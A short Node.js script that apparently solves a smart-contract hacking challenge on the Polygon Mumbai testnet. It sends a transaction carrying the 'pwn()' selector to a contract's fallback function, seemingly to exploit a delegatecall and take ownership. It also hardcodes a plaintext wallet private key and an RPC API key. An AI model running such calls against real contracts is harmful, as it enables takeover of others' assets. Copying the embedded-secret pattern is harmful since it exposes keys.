let { ethers } = require('ethers');
let sha3 = require('js-sha3');      // Install a Keccak256 implementation, such as js-sha3:
let ABI = require('./ABI.json');

let PRIVATE_KEY = "821bb94aa24de0c3ff6ef682a846f522f36dcba12b8a5de819811bcb592f43ea";
let network = "https://polygon-mumbai.g.alchemy.com/v2/BigcFnXEKcriMiJUtLFLBAk_TRjyrfic";
let Contract_address = "0xDcFcE597bd8CfFC88128a914F59288a3206eB73A";


let provider = new ethers.providers.JsonRpcProvider(network);                        // read from blockchain
let signer = new ethers.Wallet(PRIVATE_KEY, provider);                              //  write on blockchain
let i = new ethers.Contract(Contract_address,ABI,signer);                          // contract_instance

let main = async()=>
{

    let signature_ = sha3.keccak256("pwn()").slice(0, 8); // Extract first 4 bytes
    signature_ = "0x" + signature_;
    console.log("signature_=",signature_);

    // fallback function
      let txn_1 = await signer.sendTransaction(                               
      {
          to: Contract_address,
          gasLimit: 5000000,                                                  // Adjust as needed
          data : signature_,
         // value: ethers.utils.parseEther('0.000000000000000001'),        // Amount of ETH to send
      });

      await txn_1.wait();  
}

main().catch((error) => 
{
    console.log("Error aagya ===")
    console.error(error);
});



